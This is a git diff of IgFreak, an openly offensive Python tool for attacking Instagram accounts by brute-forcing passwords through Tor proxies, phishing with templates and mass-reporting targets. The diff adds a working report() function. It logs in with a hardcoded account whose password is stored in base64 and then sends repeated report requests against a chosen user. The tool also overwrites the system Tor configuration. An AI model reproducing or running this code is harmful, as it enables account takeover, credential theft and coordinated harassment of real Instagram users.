@@ -21,11 +21,12 @@
 #  MA 02110-1301, USA.
 import os
 import sys
+import marshal
 try:
 	import requests
 except Exception:
 	os.system('pip install requests')
-import requests as rs
+#import requests as rs
 def clr():
 	os.system('clear')
 try:
@@ -140,12 +141,13 @@ help = f"""
 {W}
 OPTIONS              USAGE                              REQUIRED
 
--bruteforce;-b       BruteForce Instagram Account         -pl(passlist),-u(username)
--phish;-ph           PHish any Instagram Account          -t(template)
--report;-r           Send 50 Reports to any IG Account    -u(usename)
-
+--bruteforce;-b       BruteForce Instagram Account         -pl(passlist),-u(username)
+--phish;-ph           PHish any Instagram Account          -t(template)
+--report;-r           Send 50 Reports to any IG Account    -u(usename)
+--update              Update tool to latest version
 {G}For more information visit {B}https://github.com/T-Dynamos/IgFreak
 """
+
 def check_intr():
     try:
         requests.get("https://motherfuckingwebsite.com")
@@ -153,24 +155,24 @@ def check_intr():
         print(f"{R} Internet Connection Error ")
         sys.exit(2)       
 from shutil import which
-if os.system("command -v tor > /dev/null") == 0:
-	pass
-else:
-	print(f"{R}Tor not found or not installed")
-	exit()
+
 check = os.path.isfile('/usr/bin/bash')
 if check == True:
 	fileisd = '/etc/tor/torrc'
 else:
 	fileisd = "/data/data/com.termux/files/usr/etc/tor/torrc"
 filepath = os.path.isfile(fileisd)
+
 if filepath == True:
 	filetor = open(fileisd,"w")
 	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
 	filetor.close()
 	pass
 else:
-	filetor = open(fileisd,"w")
+	from pathlib import Path
+	os.system(f"mkdir {fileisd[:-5]}")
+	Path(fileisd).touch()
+	filetor = open(fileisd,"a")
 	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
 	filetor.close()
 	pass
@@ -192,7 +194,9 @@ def check_tor():
 	else:
 		pass
 start = timer()
-
+def printBox(str):
+	a = len(str)
+	return (f'{C}╔═{a*"═"}═╗\n║ {G+str} {C}║\n╚═{a*"═"}═╝')
 try:
 	from fake_useragent import UserAgent
 	ua = UserAgent()
@@ -201,8 +205,89 @@ except Exception as e:
 import sys
 import pip
 pipv = pip.__version__
-version = 3.0
+version = 4.0
+rs = requests.session()
 
+def report(id,xx,amount,wait):
+	printInfo("Reporter")
+	print(f"{G}\nUsing Account :{C} https://instagram.com/igfreak_reporter")
+	
+
+	url = 'https://www.instagram.com/accounts/login/ajax/'
+	headers = {
+     'accept': '*/*',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+    'content-length': '275',
+    'content-type': 'application/x-www-form-urlencoded',
+    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
+    'origin': 'https://www.instagram.com',
+    'referer': 'https://www.instagram.com/',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
+    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
+    'x-ig-app-id': '936619743392459',
+    'x-ig-www-claim': '0',
+    'x-instagram-ajax': 'bc3d5af829ea',
+    'x-requested-with': 'XMLHttpRequest'}
+	import base64
+	username = "igfreak_reporter"
+	password = base64.b64decode(b'YW5zaDEyMzQ=')
+    
+	data = {
+         'username': f'{username}',
+         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{str(password.decode())}',
+         'queryParams': '{}',
+         'optIntoOneTap': 'false'}    
+	r = rs.post(url, headers=headers, data=data)
+	if  'authenticated":true' in r.text or 'userId' in r.text:
+		rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
+		pass
+	else:
+		error("Login Failed")
+		error(r.text)
+		return sys.exit(0)
+
+
+
+	if xx == 1:
+		fid="1"
+	if xx == 2:
+		fid="5"
+	if xx == 3:
+		fid="8"
+	if xx == 4:
+		fid="8"
+	if xx == 5:
+		fid="7"
+	if xx == 6:
+		fid="2"
+	if xx == 7:
+		fid="6"
+	else:
+		fid="1"
+	n=0
+	nu=0
+	u = rs.get(f"https://www.instagram.com/{id}/?__a=1")
+	i1d =  str(u.json()["graphql"]["user"]["id"])
+	print(G+"\nTarget : "+f"{id} : {C} {i1d}\n")
+	for i_1 in range(1,amount):
+		url_1=f'https://www.instagram.com/users/{i1d}/report/'
+		data_1={'source_name':'',
+		'reason_id':f'1',
+		'frx_context':''}
+		report_1=rs.post(url_1,data=data_1)
+		if '"status":"ok"' in report_1.text:
+			nu += 1
+		else:
+			n += 1
+		sys.stdout.write(G+f"\r{W}[{R+str(i_1)}{W}]{G} Sent = {C}{nu}  {Y}Error = {R} {n}")
+		sys.stdout.flush()
+		import time
+		time.sleep(wait)
+	print(G+"\n\n Done . Sent Successfull !")    		
 	
 	
 import argparse 
@@ -224,8 +309,17 @@ cli_parser.add_argument('-password-list',  # parse path to password list file
                         '-pl',
                         type=str,
                         help='password list file to try with the given username.'
-                        )
-
+)
+cli_parser.add_argument('-amount',  # parse path to password list file
+                        '-am',
+                        type=str,
+                        help='Amount of reports.'
+)
+cli_parser.add_argument('-id',  # parse path to password list file
+                  
+                        type=str,
+                        help='Amount of reports.'
+)
 cli_parser.add_argument('--verbose',  # check if the user wants verbose mode enabled
                         '--v',
                         action='count',
@@ -252,6 +346,13 @@ cli_parser.add_argument('--help',  # parse path to password list file
                         
                         help=help
                         )
+cli_parser.add_argument('--update',  # parse path to password list file
+                    
+						action='store_true',
+                        
+                        help=help
+                        )
+
 pwd = os.getcwd()
 
 def phish(template):
@@ -348,8 +449,14 @@ Parsed = cli_parser.parse_args()
 
 def ExecuteIgFreak():
     Parsed = cli_parser.parse_args()
-
+    
+    if Parsed.update == True:
+    	print("Updating...")
+    	sys.exit(0)
     if Parsed.bruteforce == True:
+    	if os.system("command -v tor > /dev/null") != 0:
+    		print(f"{R}Tor not found or not installed")
+    		sys.exit()
     	if Parsed.username is None:
     		error(" Please provide a username") 
     	elif Parsed.password_list is None:
@@ -408,10 +515,11 @@ def ExecuteIgFreak():
     		print()
     		error("Please Provide a template")
     		exit()
-    elif Parsed.report == True:
+    elif Parsed.report == True: 
     	if Parsed.username is not None:
-    		print(f"Reporter will be soon supported")
-    		exit(0)
+    		if Parsed.amount is not None:
+    			if Parsed.id is not None:
+    				report(Parsed.username,int(Parsed.id),int(Parsed.amount),0.5)
     	else:
     		error("Please provide a username")
     		exit()
@@ -442,23 +550,9 @@ url = 'https://www.instagram.com/accounts/login/ajax/'
 import random
 	
 def signin(password,username):
-         usa1 = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36'
-         usa2 = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36'
-         usa3 = 'Mozilla/5.0 (Linux; Android 9; SM-J701F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 GSA/12.22.8.23.arm'
-         us4 = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36'
 
-         us9 = 'Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
-         us10 = 'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
-         us11 = 'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
-         us12  = 'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36'
-         us15 = 'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)'
-         us16 = 'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36'
-         us13 = 'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/94.0'
-         us14 = 'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:94.0) Gecko/94.0 Firefox/94.0'
-         user = ua.firefox
-         usa = (usa1,usa2,usa3,us4,us9,us10,us11,us12,us14,us15,us16)
-         usa = random.choice(list(usa))
-         s = rs.Session()
+        
+         user=ua.random
 		  
          headers = {
      'accept': '*/*',
@@ -499,7 +593,7 @@ def signin(password,username):
          print(f"{B}[{G}>{B}]{W} Using Proxy : {G}{por2}")
 
          try:
-         	r = rs.post(url, headers=headers, data=data,proxies=por,timeout=10)
+         	r = requests.post(url, headers=headers, data=data,proxies=por,timeout=10)
          except Exception as e:
          	error(str(e))
          	exit()
@@ -517,6 +611,7 @@ def signin(password,username):
          
          
          if  'authenticated":true' in r.text or 'userId' in r.text:
+         	rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
          	print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
          	print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
          	strtxt = username+".igfreak"
@@ -579,4 +674,7 @@ def check_igid(username):
     	error("Check the victim's account")
     	exit()
 
-ExecuteIgFreak()   
+if __name__=="__main__":
+	ExecuteIgFreak()   
+else:
+	pass
